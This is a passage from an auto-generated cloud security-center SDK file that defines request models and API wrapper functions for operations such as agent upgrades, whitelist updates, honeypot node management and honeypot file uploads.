  if (!Util.isUnset(request.cronType)) {
    query['CronType'] = request.cronType;
  }
  if (!Util.isUnset(request.duration)) {
    query['Duration'] = request.duration;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdatePublishCron',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the configuration of the client upgrade time. If you want to call this operation, contact technical support.
 *
 * @param request UpdatePublishCronRequest
 * @return UpdatePublishCronResponse
 */
async function updatePublishCron(request: UpdatePublishCronRequest): UpdatePublishCronResponse {
  var runtime = new Util.RuntimeOptions{};
  return updatePublishCronWithOptions(request, runtime);
}

model UpdatePublishGraySwitchRequest {
  graySwitchStatus?: int32(name='GraySwitchStatus', description='Specifies whether to enable the canary release feature. Valid values:

*   **1**: enabled.
*   **0**: disabled.

This parameter is required.', example='1'),
}

model UpdatePublishGraySwitchResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='231A8A81-CBB4-5AB3-A624-98A501******'),
}

model UpdatePublishGraySwitchResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdatePublishGraySwitchResponseBody(name='body'),
}

/**
 * @summary Modifies the settings of the canary release feature for agent upgrade. If you want to use the feature, contact technical support.
 *
 * @param request UpdatePublishGraySwitchRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdatePublishGraySwitchResponse
 */
async function updatePublishGraySwitchWithOptions(request: UpdatePublishGraySwitchRequest, runtime: Util.RuntimeOptions): UpdatePublishGraySwitchResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.graySwitchStatus)) {
    query['GraySwitchStatus'] = request.graySwitchStatus;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdatePublishGraySwitch',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the settings of the canary release feature for agent upgrade. If you want to use the feature, contact technical support.
 *
 * @param request UpdatePublishGraySwitchRequest
 * @return UpdatePublishGraySwitchResponse
 */
async function updatePublishGraySwitch(request: UpdatePublishGraySwitchRequest): UpdatePublishGraySwitchResponse {
  var runtime = new Util.RuntimeOptions{};
  return updatePublishGraySwitchWithOptions(request, runtime);
}

model UpdateSelectionKeyByTypeRequest {
  businessType?: string(name='BusinessType', description='The business type of the asset selection. Valid value:

*   **VIRUS_SCAN_CYCLE_CONFIG**: virus detection configuration.
*   **VIRUS_SCAN_ONCE_TASK**: one-time scan for virus detection.
*   **AGENTLESS_MALICIOUS_WHITE_LIST_[ID]**: a whitelist rule for alerts that are generated by the agentless detection feature.
*   **AGENTLESS_VUL_WHITE_LIST_[ID]**: a whitelist rule for vulnerabilities that are detected by the agentless detection feature.
*   **FILE_PROTECT_RULE_SWITCH_TYPE_[ID]**: key file protection.', example='VIRUS_SCAN_CYCLE_CONFIG'),
  selectionKey?: string(name='SelectionKey', description='The unique identifier of the asset selection.', example='614d179e-4776-4939-a04a-d842ce64****'),
}

model UpdateSelectionKeyByTypeResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='DBABBC2E-26DF-5586-BF7C-4FC846EF****'),
}

model UpdateSelectionKeyByTypeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateSelectionKeyByTypeResponseBody(name='body'),
}

/**
 * @summary Updates the unique identifier of an asset selection.
 *
 * @param request UpdateSelectionKeyByTypeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateSelectionKeyByTypeResponse
 */
async function updateSelectionKeyByTypeWithOptions(request: UpdateSelectionKeyByTypeRequest, runtime: Util.RuntimeOptions): UpdateSelectionKeyByTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.businessType)) {
    query['BusinessType'] = request.businessType;
  }
  if (!Util.isUnset(request.selectionKey)) {
    query['SelectionKey'] = request.selectionKey;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateSelectionKeyByType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Updates the unique identifier of an asset selection.
 *
 * @param request UpdateSelectionKeyByTypeRequest
 * @return UpdateSelectionKeyByTypeResponse
 */
async function updateSelectionKeyByType(request: UpdateSelectionKeyByTypeRequest): UpdateSelectionKeyByTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateSelectionKeyByTypeWithOptions(request, runtime);
}

model UpdateStrictEventNameRequest {
  eventNameList?: [ string ](name='EventNameList', description='List of strict alarms to be operated on. This list is a complete list, and any strict alarms not included in this list will have the opposite operation performed.
> You can call [DescribeStrictEventName](~~DescribeStrictEventName~~) to get the list of all strict mode alarms.
> -'),
  lang?: string(name='Lang', description='Sets the language type for requests and received messages, default is **zh**. Values:

- **zh**: Chinese
- **en**: English', example='zh'),
  operator?: string(name='Operator', description='Operation rule determination operator:
- *on*: Turn on the alarm
- *off*: Turn off the alarm

This parameter is required.', example='on'),
}

model UpdateStrictEventNameResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7532B7EE-7CE7-5F4D-BF04-B12447DD****'),
}

model UpdateStrictEventNameResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateStrictEventNameResponseBody(name='body'),
}

/**
 * @summary Update the selected strict events in strict mode
 *
 * @param request UpdateStrictEventNameRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateStrictEventNameResponse
 */
async function updateStrictEventNameWithOptions(request: UpdateStrictEventNameRequest, runtime: Util.RuntimeOptions): UpdateStrictEventNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventNameList)) {
    query['EventNameList'] = request.eventNameList;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.operator)) {
    query['Operator'] = request.operator;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateStrictEventName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Update the selected strict events in strict mode
 *
 * @param request UpdateStrictEventNameRequest
 * @return UpdateStrictEventNameResponse
 */
async function updateStrictEventName(request: UpdateStrictEventNameRequest): UpdateStrictEventNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateStrictEventNameWithOptions(request, runtime);
}

model UpdateTargetListByBatchRequest {
  batchId?: long(name='BatchId', description='The ID of the release batch.

This parameter is required.', example='52370'),
  operationList?: [ 
    {
      groupId?: string(name='GroupId', description='The ID of the server group.

>  You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.', example='11883086'),
      operation?: string(name='Operation', description='The operation type. Valid values:

*   **add**: the add operation.
*   **del**: the remove operation.', example='add'),
      uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='de393767-6fe1-4a8d-837d-927a2b******'),
      vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the VPC-connected instance.', example='vpc-bp1ow0rm9t92iza******'),
    }
  ](name='OperationList', description='The operations on assets.

This parameter is required.'),
}

model UpdateTargetListByBatchResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='FBBEB173-1F43-505F-A876-C03ECD******'),
}

model UpdateTargetListByBatchResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateTargetListByBatchResponseBody(name='body'),
}

/**
 * @summary Updates machines in a release batch.
 *
 * @param request UpdateTargetListByBatchRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateTargetListByBatchResponse
 */
async function updateTargetListByBatchWithOptions(request: UpdateTargetListByBatchRequest, runtime: Util.RuntimeOptions): UpdateTargetListByBatchResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.batchId)) {
    query['BatchId'] = request.batchId;
  }
  if (!Util.isUnset(request.operationList)) {
    query['OperationList'] = request.operationList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateTargetListByBatch',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Updates machines in a release batch.
 *
 * @param request UpdateTargetListByBatchRequest
 * @return UpdateTargetListByBatchResponse
 */
async function updateTargetListByBatch(request: UpdateTargetListByBatchRequest): UpdateTargetListByBatchResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateTargetListByBatchWithOptions(request, runtime);
}

model UpdateWhiteListRequest {
  registryId?: long(name='RegistryId', description='Image repository ID.
> You can obtain this parameter by calling the [PageImageRegistry](~~PageImageRegistry~~) interface.

This parameter is required.', example='19882'),
  whiteList?: string(name='WhiteList', description='Whitelist list. If there are multiple whitelisted addresses, separate them with a comma (,).

This parameter is required.', example='192.168.XXX.XXX,192.180.XXX.XXX'),
}

model UpdateWhiteListResponseBody = {
  data?: boolean(name='Data', description='Processing result.', example='true'),
  requestId?: string(name='RequestId', description='The ID of this call request, which is a unique identifier generated by Alibaba Cloud for the request. It can be used to troubleshoot and pinpoint issues.', example='576EF709-71CE-500F-95FC-7F7A297D****'),
}

model UpdateWhiteListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateWhiteListResponseBody(name='body'),
}

/**
 * @summary Modify Image Service Whitelist.
 *
 * @param request UpdateWhiteListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateWhiteListResponse
 */
async function updateWhiteListWithOptions(request: UpdateWhiteListRequest, runtime: Util.RuntimeOptions): UpdateWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.registryId)) {
    query['RegistryId'] = request.registryId;
  }
  if (!Util.isUnset(request.whiteList)) {
    query['WhiteList'] = request.whiteList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modify Image Service Whitelist.
 *
 * @param request UpdateWhiteListRequest
 * @return UpdateWhiteListResponse
 */
async function updateWhiteList(request: UpdateWhiteListRequest): UpdateWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateWhiteListWithOptions(request, runtime);
}

model UpdateWhiteListStrategyStatusRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='219.143.XX.XX'),
  status?: int32(name='Status', description='The status of the policy. Valid values:

*   **0**: deleted
*   **1**: learning
*   **2**: paused
*   **3**: learning completed
*   **4**: enabled

> 

*   You can change the status to **paused** only if the policy status is **learning**.

*   You can change the status to **learning** only if the policy status is **paused**.

*   You can change the status to **enabled** only if the policy status is **learning completed**.

This parameter is required.', example='1'),
  strategyIds?: string(name='StrategyIds', description='The ID of the policy.

>  You can call the [DescribeWhiteListStrategyList](~~DescribeWhiteListStrategyList~~) operation to obtain the ID.

This parameter is required.', example='8516'),
}

model UpdateWhiteListStrategyStatusResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='379a9b8f-107b-4630-9e95-2299a1ea****'),
}

model UpdateWhiteListStrategyStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateWhiteListStrategyStatusResponseBody(name='body'),
}

/**
 * @summary Updates the status of an application whitelist policy.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request UpdateWhiteListStrategyStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateWhiteListStrategyStatusResponse
 */
async function updateWhiteListStrategyStatusWithOptions(request: UpdateWhiteListStrategyStatusRequest, runtime: Util.RuntimeOptions): UpdateWhiteListStrategyStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.strategyIds)) {
    query['StrategyIds'] = request.strategyIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateWhiteListStrategyStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Updates the status of an application whitelist policy.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request UpdateWhiteListStrategyStatusRequest
 * @return UpdateWhiteListStrategyStatusResponse
 */
async function updateWhiteListStrategyStatus(request: UpdateWhiteListStrategyStatusRequest): UpdateWhiteListStrategyStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateWhiteListStrategyStatusWithOptions(request, runtime);
}

model UpgradeBackupPolicyVersionRequest {
  id?: long(name='Id', description='The ID of the anti-ransomware policy.

> You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.

This parameter is required.', example='123'),
}

model UpgradeBackupPolicyVersionResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9F5B8057-3E44-54DC-AC89-6814A4CD****'),
}

model UpgradeBackupPolicyVersionResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpgradeBackupPolicyVersionResponseBody(name='body'),
}

/**
 * @summary Upgrades the version of an anti-ransomware policy.
 *
 * @param request UpgradeBackupPolicyVersionRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpgradeBackupPolicyVersionResponse
 */
async function upgradeBackupPolicyVersionWithOptions(request: UpgradeBackupPolicyVersionRequest, runtime: Util.RuntimeOptions): UpgradeBackupPolicyVersionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpgradeBackupPolicyVersion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Upgrades the version of an anti-ransomware policy.
 *
 * @param request UpgradeBackupPolicyVersionRequest
 * @return UpgradeBackupPolicyVersionResponse
 */
async function upgradeBackupPolicyVersion(request: UpgradeBackupPolicyVersionRequest): UpgradeBackupPolicyVersionResponse {
  var runtime = new Util.RuntimeOptions{};
  return upgradeBackupPolicyVersionWithOptions(request, runtime);
}

model UpgradeHoneypotNodeRequest {
  allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet', description='Specifies whether to allow the honeypot to access the Internet. Valid values:

*   **true**
*   **false**', example='true'),
  lang?: string(name='Lang', description='The language of the content within the request and response.

*   **zh**: Chinese
*   **en**: English', example='zh'),
  nodeId?: string(name='NodeId', description='The ID of the management node that you want to upgrade.

>  You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to obtain the ID.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
}

model UpgradeHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='F832F2D0-C4CD-507B-8C14-CE1F25A7*****'),
  success?: boolean(name='Success', description='Indicates whether the call is successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model UpgradeHoneypotNodeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpgradeHoneypotNodeResponseBody(name='body'),
}

/**
 * @summary Upgrades the version of the management node to which a honeypot belongs.
 *
 * @param request UpgradeHoneypotNodeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpgradeHoneypotNodeResponse
 */
async function upgradeHoneypotNodeWithOptions(request: UpgradeHoneypotNodeRequest, runtime: Util.RuntimeOptions): UpgradeHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.allowHoneypotAccessInternet)) {
    query['AllowHoneypotAccessInternet'] = request.allowHoneypotAccessInternet;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpgradeHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Upgrades the version of the management node to which a honeypot belongs.
 *
 * @param request UpgradeHoneypotNodeRequest
 * @return UpgradeHoneypotNodeResponse
 */
async function upgradeHoneypotNode(request: UpgradeHoneypotNodeRequest): UpgradeHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return upgradeHoneypotNodeWithOptions(request, runtime);
}

model UpgradeVersionByUuidsRequest {
  upgradeVersion?: string(name='UpgradeVersion', description='The version to which you want to upgrade the client.

This parameter is required.', example='0.0.9'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the assets on which you want to run the detection task.

This parameter is required.'),
}

model UpgradeVersionByUuidsResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model UpgradeVersionByUuidsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpgradeVersionByUuidsResponseBody(name='body'),
}

/**
 * @summary Manually upgrades the client version on assets.
 *
 * @param request UpgradeVersionByUuidsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpgradeVersionByUuidsResponse
 */
async function upgradeVersionByUuidsWithOptions(request: UpgradeVersionByUuidsRequest, runtime: Util.RuntimeOptions): UpgradeVersionByUuidsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.upgradeVersion)) {
    query['UpgradeVersion'] = request.upgradeVersion;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpgradeVersionByUuids',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Manually upgrades the client version on assets.
 *
 * @param request UpgradeVersionByUuidsRequest
 * @return UpgradeVersionByUuidsResponse
 */
async function upgradeVersionByUuids(request: UpgradeVersionByUuidsRequest): UpgradeVersionByUuidsResponse {
  var runtime = new Util.RuntimeOptions{};
  return upgradeVersionByUuidsWithOptions(request, runtime);
}

model UploadedHoneyPotFileRequest {
  fileKey?: string(name='FileKey', description='The file key that you use to upload the file.

>  The key is in the format of HONEYPOT_FILE/{Timestamp}_{Custom file name}.

This parameter is required.', example='HONEYPOT_FILE/1601097845544644_********'),
  fileName?: string(name='FileName', description='The name of the file that you want to upload.

This parameter is required.', example='trojan.zip'),
  fileType?: string(name='FileType', description='The file type.

This parameter is required.', example='application/zip'),
  honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.

This parameter is required.', example='ruoyi'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  nodeId?: string(name='NodeId', description='The ID of the management node to which the honeypot belongs.

>  You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to obtain the IDs of management nodes. operation to query the management node ID.', example='cc427e14-f257-4670-9d2b-d83bbbe*****'),
  templateExtra?: string(name='TemplateExtra', description='The prompt template that corresponds to the file.

This parameter is required.', example='{\\\\"help\\\\":\\\\".zip\\\\",\\\\"label\\\\":\\\\"file\\\\",\\\\"type\\\\":\\\\"file\\\\",\\\\"key\\\\":\\\\"ftpfiles.zip\\\\"}'),
}

model UploadedHoneyPotFileResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='427F89F8-6DFE-57CC-9593-3487CA93****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model UploadedHoneyPotFileResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UploadedHoneyPotFileResponseBody(name='body'),
}

/**
 * @summary Uploads a honeypot file.
 *
 * @param request UploadedHoneyPotFileRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UploadedHoneyPotFileResponse
 */
async function uploadedHoneyPotFileWithOptions(request: UploadedHoneyPotFileRequest, runtime: Util.RuntimeOptions): UploadedHoneyPotFileResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.fileKey)) {
    query['FileKey'] = request.fileKey;
  }
  if (!Util.isUnset(request.fileName)) {
    query['FileName'] = request.fileName;
  }
  if (!Util.isUnset(request.fileType)) {
    query['FileType'] = request.fileType;
  }
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.templateExtra)) {
    query['TemplateExtra'] = request.templateExtra;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UploadedHoneyPotFile',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Uploads a honeypot file.
 *
 * @param request UploadedHoneyPotFileRequest
 * @return UploadedHoneyPotFileResponse
 */
async function uploadedHoneyPotFile(request: UploadedHoneyPotFileRequest): UploadedHoneyPotFileResponse {
  var runtime = new Util.RuntimeOptions{};
  return uploadedHoneyPotFileWithOptions(request, runtime);
}

model ValidateHcWarningsRequest {
  checkIds?: string(name='CheckIds', description='The IDs of check items that you want to verify. Separate multiple IDs with commas (,).
> You can use [DescribeCheckWarningSummary](https://help.aliyun.com/document_detail/116179.html) to get IDs of check items.', example='695,234'),
  riskIds?: string(name='RiskIds', description='The IDs of risk items that you want to verify. Separate multiple IDs with commas (,).', example='43'),
  status?: int32(name='Status', description='The status of the check item that you want to verify.

*   1: failed
*   3: passed
*   5: expired', example='1'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers on which you want to verify the risk items. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='78645c8e-2e89-441b-8eb,a9622a6b-adb5-4dd3-929e,0136460a-1cb5-44e8-****'),
}

model ValidateHcWarningsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='722C4F88-7867-4E7B-8ADE-7451053'),
}

model ValidateHcWarningsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ValidateHcWarningsResponseBody(name='body'),
}

/**
 * @summary Verifies whether risk items are fixed. If a risk item is fixed, the status of the related check item is updated to Passed.
 *
 * @param request ValidateHcWarningsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ValidateHcWarningsResponse
 */
async function validateHcWarningsWithOptions(request: ValidateHcWarningsRequest, runtime: Util.RuntimeOptions): ValidateHcWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.riskIds)) {
    query['RiskIds'] = request.riskIds;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ValidateHcWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Verifies whether risk items are fixed. If a risk item is fixed, the status of the related check item is updated to Passed.
 *
 * @param request ValidateHcWarningsRequest
 * @return ValidateHcWarningsResponse
 */
async function validateHcWarnings(request: ValidateHcWarningsRequest): ValidateHcWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return validateHcWarningsWithOptions(request, runtime);
}

model VerifyCheckCustomConfigRequest {
  checkId?: long(name='CheckId', description='Check item ID.', example='76'),
  customConfigs?: [ 
    {
      name?: string(name='Name', description='Name of the custom configuration item for the check item, unique within the same check item.', example='IPList'),
      operation?: string(name='Operation', description='Operation type for the custom configuration item of the check item. Only pass DELETE when deleting; no need to pass for creation or update.', example='DELETE'),
      value?: string(name='Value', description='User-configured value string for the custom configuration item of the check item.', example='10.12.4.XX'),
    }
  ](name='CustomConfigs', description='List of custom configuration items for the check item.'),
  repairConfigs?: [ 
    {
      flowId?: string(name='FlowId', description='ID of the repair process during the repair.', example='7fec0a3395b345c18f108ffc9fc0****'),
      name?: string(name='Name', description='Name of the repair parameter for the check item, unique within the same check item.', example='IPLists'),
      operation?: string(name='Operation', description='Operation type for the custom configuration item of the check item. Only pass DELETE when deleting; no need to pass for creation or update.', example='DELETE'),
      value?: string(name='Value', description='User-configured value string for the repair parameter of the check item.', example='172.26.49.XX'),
    }
  ](name='RepairConfigs', description='Repair parameters supported by the check item\\\\"s repair function.'),
}

model VerifyCheckCustomConfigResponseBody = {
  errorCheckConfigs?: [ 
    {
      errorCode?: string(name='ErrorCode', description='Error code.', example='ConfigEqualIllegal'),
